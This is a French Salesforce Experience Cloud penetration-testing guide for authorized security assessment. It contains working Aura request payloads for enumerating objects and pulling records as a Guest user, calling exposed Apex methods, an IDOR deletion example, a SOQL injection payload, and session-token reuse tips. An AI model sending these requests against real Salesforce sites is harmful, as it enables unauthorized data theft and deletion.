    Tests d'intrusion

    Grey box

    Vue d'ensemble

    Les tests grey box sur une application Salesforce (Experience Cloud / Community) suivent quatre étapes principales :

    1. Récupérer les noms des objets custom
    2. Extraire des données depuis les objets (standards et customs)
    3. Crawler l'application pour énumérer les classes Apex potentiellement exposées
    4. Tenter d'exploiter les méthodes de ces classes

    Étape 1 - Récupérer les objets custom

    Naviguer dans l'application en interceptant le trafic via Burp Suite. Dans l'HTTP History, repérer les requêtes envoyées aux chemins suivants :

    • /s/sfsites/aura
    • /aura
    • /sfsites/aura

    Cibler les requêtes dont le body contient la clé {"actions":[.

    Remplacer la valeur du paramètre message par le payload suivant afin de récupérer les objets custom accessibles par un utilisateur Guest :

    {"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION$getConfigData","callingDescriptor":"UNKNOWN","params":{}}]}

    La réponse contient une clé apiNamesToKeyPrefixes. Rechercher la chaîne __c dans la réponse et noter tous les objets dont le nom se termine par ce suffixe, ce sont les objets custom.

    Étape 2 - Extraire des données depuis les objets

    Note : À partir de cette étape, Intruder est utilisé de manière intensive. Chaque payload message contient une valeur MARKER : c'est autour de cette valeur que les marqueurs Intruder doivent être placés.

    Envoyer la requête depuis Repeater vers Intruder. Dans l'onglet Positions, remplacer la valeur du paramètre message par le payload suivant :

    {"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"MARKER","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}

    La méthode $getItems de ce controller est un exemple de méthode native permettant d'extraire des données depuis un objet. Voici le rôle des paramètres clés :

    Paramètre Description
    entityNameOrId Nom de l'objet cible
    getCount Si true, retourne le nombre total d'enregistrements
    pageSize Nombre maximum d'enregistrements retournés (plafonné à 1000)
    currentPage Page courante - incrémenter pour paginer les résultats si pageSize est plafonné

    Dans l'onglet Payloads, constituer la liste Simple List avec : - Les objets custom récupérés à l'étape 1 - Les objets natifs Salesforce suivants, connus pour contenir des données sensibles :

    Case
Account
User
Contact
Document
ContentDocument
ContentVersion
ContentBody
CaseComment
Note
Employee
Attachment
EmailMessage
CaseExternalDocument
Lead
Name
EmailTemplate
EmailMessageRelation

    Lancer l'attaque. Une fois terminée, trier les résultats par longueur de réponse décroissante : les réponses inférieures à 12 000 caractères correspondent généralement soit à un accès refusé à l'objet, soit à un retour contenant uniquement l'enregistrement du Guest lui-même.

    Étape 3 - Énumérer les classes Apex exposées

    L'objectif est d'identifier les méthodes de classes Apex custom accessibles via l'endpoint Aura, en crawlant l'application.

    Méthode principale - recherche dans les réponses Burp

    Deux marqueurs permettent de repérer les définitions ou appels de classes Apex custom dans le trafic intercepté :

    Marqueur Où chercher
    apex%3a%2f%2f Dans les requêtes
    compound://c Dans les réponses

    Se concentrer sur le second marqueur : tout appel Apex effectué en arrière-plan renvoie ce type de réponse et permet de remonter au descriptor de la méthode.

    Exemple de réponse typique :

    "componentDefs":[
  {
    "xs": "G",
    "descriptor": "markup://c:SampleComponent",
    "cd": {
      "descriptor": "compound://c.SampleComponent",
      "ac": [
        {
          "n": "getBaseUrl",
          "descriptor": "apex://SampleController/ACTION$getBaseUrl",
          "at": "SERVER",
          "rt": "apex://Map<String,String>",
          "pa": [{"name": "url", "type": "apex://String"}]
        }
      ]
    }
  }
]

    Valeurs importantes à relever :

    Clé Description
    descriptor (dans componentDefs) Identifiant du composant Aura, au format namespace:composant. Peut servir à récupérer la définition complète.
    rt Type de retour de la méthode Apex
    pa Paramètres attendus par la méthode (nom et type)

    Distinction controllers natifs vs custom :

    CONTROLLER NATIF :
aura://RecordUiController/ACTION$getObjectInfo

CONTROLLER CUSTOM :
apex://New_Sales_Controller/ACTION$getSalesData

    Les controllers préfixés par apex:// sont des classes Apex custom - ce sont ceux à cibler en priorité.

    Méthodes alternatives si le crawl ne remonte rien

    • Rechercher la chaîne apex:// directement dans l'historique Burp
    • Tenter d'énumérer les classes Apex via $getItems avec entityNameOrId = ApexClass
    • Inspecter les fichiers JavaScript de l'application et chercher le pattern componentService.initControllerDefs([{ :
    • app.js
    • aura_prod.js

    Étape 4 - Exploiter les méthodes Apex

    Construire et envoyer un appel à une méthode

    Une fois une méthode identifiée (nom du controller, nom de la méthode, paramètres attendus), construire le payload message de la façon suivante :

    {"actions":[{"id":"46;a","descriptor":"apex://NovaBaseController/ACTION$getBaseUrl","callingDescriptor":"UNKNOWN","params":{"url":"https://google.com/something"}}]}
    Clé Description
    id Valeur arbitraire, sans importance
    descriptor Chemin vers la méthode : apex://NomDuController/ACTION$nomDeLaMethode
    callingDescriptor Idéalement le markup du composant appelant, mais "UNKNOWN" est accepté dans tous les cas
    params Objet JSON contenant les paramètres de la méthode et leurs valeurs

    Pour les valeurs des paramètres de type String : partir d'une valeur plausible en se basant sur le nom du paramètre - c'est souvent suffisant pour obtenir une réponse exploitable.

    Exemple de returnValue retourné par la méthode ci-dessus :

    "returnValue": {
  "completeUrl": "https://google.com/something",
  "pathUrl": "/something"
}

    Obtenir la liste complète des méthodes d'un composant via /auraCmpDef

    Quand les réponses Burp sont trop volumineuses pour isoler les méthodes d'un composant précis, l'endpoint /auraCmpDef permet d'en obtenir la définition complète.

    Format de l'URL :

    /auraCmpDef?aura.app=<APP_MARKUP>&_au=<AU_VALUE>&_ff=DESKTOP&_l=true&_cssvar=false&_c=false&_l10n=en_US&_style=-1450740311&_density=VIEW_ONE&_def=<COMPONENT_MARKUP>

    Les valeurs aura.app et _au se trouvent à deux endroits dans Burp : - Dans le paramètre POST aura.context d'une requête vers l'endpoint Aura - Dans la réponse qui décrit le composant custom (chercher Application@ dans la réponse)

    La valeur _def est le descriptor du composant, au format markup://c:NomDuComposant (chercher "descriptor":"markup://c dans la réponse de l'étape 3).

    Exemple d'URL finale (l'endpoint /auraCmpDef se trouve dans le même répertoire que /aura) :

    /auraCmpDef?aura.app=markup://siteforce:communityApp&_au=8KVdMoLuAGi15YkxlC35vw&_ff=DESKTOP&_l=true&_cssvar=false&_c=false&_l10n=en_US&_style=-1450740311&_density=VIEW_ONE&_def=markup://c:NOVABaseComponent

    La requête effectue une redirection 302 vers la définition complète du composant, avec la liste de toutes ses méthodes et leurs paramètres.

    Cas particulier - paramètres de type objet

    Quand un paramètre attend un objet (pa de type apex://MonObjet) plutôt qu'un type primitif (String, Integer…), il faut deviner les champs internes de cet objet, ce qui est nettement plus complexe.

    Astuce : si la méthode à appeler attend un objet de type aura://User en paramètre, chercher une autre méthode dont le rt (type de retour) est aura://User, l'appeler en premier, puis réutiliser sa réponse comme valeur d'entrée pour la méthode cible.

    Exemples concrets

    Exemple 1 - IDOR via controller custom mal sanitisé

    Un développeur expose deux méthodes sur un controller custom : - getSalesData - retourne les données de ventes de tous les utilisateurs (accessible à tous) - deleteSalesDataById - censée supprimer uniquement les données de l'utilisateur courant, mais sans vérification côté serveur

    Appel de getSalesData pour récupérer les IDs :

    {"actions":[{"id":"1;a","descriptor":"apex://New_Sales_Controller/ACTION$getSalesData","callingDescriptor":"UNKNOWN","params":{}}]}

    La réponse expose les enregistrements de tous les utilisateurs, dont leurs Id Salesforce. Il suffit de copier l'Id d'une victime et de le passer à deleteSalesDataById :

    {"actions":[{"id":"1;a","descriptor":"apex://New_Sales_Controller/ACTION$deleteSalesDataById","callingDescriptor":"UNKNOWN","params":{"id":"0099g000001mWQaYHU"}}]}

    L'absence de vérification que l'id passé appartient à l'utilisateur courant permet de supprimer les données d'un autre utilisateur - IDOR classique.

    Exemple 2 - SOQL Injection

    Si un endpoint Aura passe une entrée utilisateur directement dans une query SOQL sans validation :

    // Input utilisateur : name=bob
SELECT Id FROM Contact WHERE (IsDeleted = false AND Name LIKE '%bob%')

    Contraintes SOQL à connaître : SELECT uniquement (pas d'INSERT/UPDATE/DELETE), pas de UNION, pas de JOIN, et pas de commentaires (le -- SQL ne fonctionne pas).

    Payload d'injection :

    name: test%') OR (Name LIKE '

    Query résultante - retourne tous les contacts :

    SELECT Id FROM Contact WHERE (IsDeleted = false AND Name LIKE '%test%') OR (Name LIKE '%')

    Le payload se termine par une simple quote ' (et non --) car il n'est pas possible de commenter en SOQL : il faut refermer syntaxiquement la quote finale déjà présente dans la query originale.

    Glossaire des payloads Aura

    Référence des méthodes de controllers Aura natifs utiles lors d'un test grey box. La valeur *** indique un paramètre à remplacer par la valeur cible.

    Controller / Méthode Rôle
    HostConfigController/ACTION$getConfigData Liste tous les objets disponibles (standards et customs)
    SelectableListDataProviderController/ACTION$getItems Extrait les enregistrements d'un objet (max 1000/page)
    DetailController/ACTION$getRecord Retourne tous les champs d'un enregistrement par ID
    RecordUiController/ACTION$getObjectInfo Retourne les métadonnées d'un objet (champs, types)
    ListUiController/ACTION$getListsByObjectName Liste les vues disponibles pour un objet
    ScopedResultsDataProviderController/ACTION$getLookupItems Recherche des enregistrements contenant un terme
    ProfileMenuController/ACTION$getProfileMenuResponse Retourne les infos de l'utilisateur courant
    ApexActionController/ACTION$execute Appelle une méthode Apex custom (alternative au descriptor direct)

    HostConfigController/ACTION$getConfigData

    {"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION$getConfigData","callingDescriptor":"UNKNOWN","params":{}}]}

    SelectableListDataProviderController/ACTION$getItems

    Paramètres : entityNameOrId (objet cible), pageSize (plafonné à 1000), currentPage, getCount.

    {"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"***","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}

    DetailController/ACTION$getRecord

    Paramètre : recordId (ID Salesforce de l'enregistrement).

    {"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord","callingDescriptor":"UNKNOWN","params":{"recordId":"***","record":null,"inContextOfComponent":"","mode":"VIEW","layoutType":"FULL","defaultFieldValues":null,"navigationLocation":"LIST_VIEW_ROW"}}]}

    RecordUiController/ACTION$getObjectInfo

    Paramètre : objectApiName.

    {"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"***"}}]}

    ListUiController/ACTION$getListsByObjectName

    Paramètre : objectApiName.

    {"actions":[{"id":"1;a","descriptor":"aura://ListUiController/ACTION$getListsByObjectName","callingDescriptor":"UNKNOWN","params":{"objectApiName":"***"}}]}

    ScopedResultsDataProviderController/ACTION$getLookupItems

    Paramètres : scope (objet), term (terme de recherche, min. 4 caractères), additionalFields.

    {"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.search.components.forcesearch.scopedresultsdataprovider.ScopedResultsDataProviderController/ACTION$getLookupItems","callingDescriptor":"UNKNOWN","params":{"scope":"User","term":"script","pageSize":10,"currentPage":1,"enableRowActions":false,"additionalFields":[],"useADS":false}}]}

    ProfileMenuController/ACTION$getProfileMenuResponse

    {"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.self.service.components.profileMenu.ProfileMenuController/ACTION$getProfileMenuResponse","callingDescriptor":"UNKNOWN","params":{}}]}

    ApexActionController/ACTION$execute

    Méthode alternative pour appeler une classe Apex custom sans passer par le descriptor apex:// direct. Paramètres : classname (nom de la classe), method (méthode à appeler), params (paramètres de la méthode).

    {"actions":[{"id":"123;a","descriptor":"aura://ApexActionController/ACTION$execute","callingDescriptor":"UNKNOWN","params":{"namespace":"","classname":"<APEX_CLASSNAME>","method":"<APEX_METHOD>","params":{},"cacheable":false,"isContinuation":false}}]}

    White box

    En mode white box, les tests d'intrusion s'appuient sur les résultats de la revue de code source réalisée avec PMD. Les vulnérabilités identifiées par l'analyse statique servent de points d'entrée pour la tentative d'exploitation.

    Tips pratiques

    Tip Détail
    Pages Visualforce Accès direct via https://<instance>.salesforce.com/apex/NomDeLaPage
    Composants Aura Accès direct via https://<instance>.salesforce.com/lightning/n/NomDuComposant
    Aura endpoint Envoyer des requêtes POST à /aura (ou /s/sfsites/aura sur Experience Cloud) pour énumérer les actions de composants Aura accessibles. Capturer dans BURP et les rejouer/modifier.
    REST API Salesforce GET /services/data/vXX.X/sobjects/ liste tous les SObjects accessibles avec le compte courant. Combiner avec des requêtes SOQL via SF Inspector ou directement via l'API REST.
    Apex REST custom Quand une classe Apex est annotée @RestResource(urlMapping='/MonEndpoint/*'), elle est exposée à https://<instance>.salesforce.com/services/apexrest/MonEndpoint/. Repérer ces annotations dans la revue de code source. Authentification : ajouter le header Authorization: Bearer <sid> (token récupéré via tip 4). La méthode HTTP supportée dépend des annotations : @HttpGet, @HttpPost, @HttpPatch, @HttpDelete. Tester chaque méthode exposée et injecter des payloads dans les paramètres d'URL et le body.
    Récupération du session token Dans les DevTools (Application > Cookies > sid ou localStorage), récupérer le token de session pour l'utiliser dans Postman ou curl afin de tester l'API REST hors navigateur.
    Permission "Author Apex" Vérifier si le compte de test possède cette permission (Setup > Users > System Permissions). Si oui, c'est un finding en soi : l'utilisateur peut exécuter du code Apex arbitraire via la Developer Console.
    Custom Settings & Custom Metadata Types Requêter via SOQL (SF Inspector) les objets __c (Custom Setting) et __mdt (Custom Metadata). Ces objets peuvent contenir des clés API, tokens ou credentials stockés en clair.
    Guest User Experience Cloud Si un site Experience Cloud est en place, tester en navigation privée sur l'URL publique du site. Le profil Guest User associé se trouve dans : Setup > Digital Experiences > All Sites > cliquer sur le site > Administration.
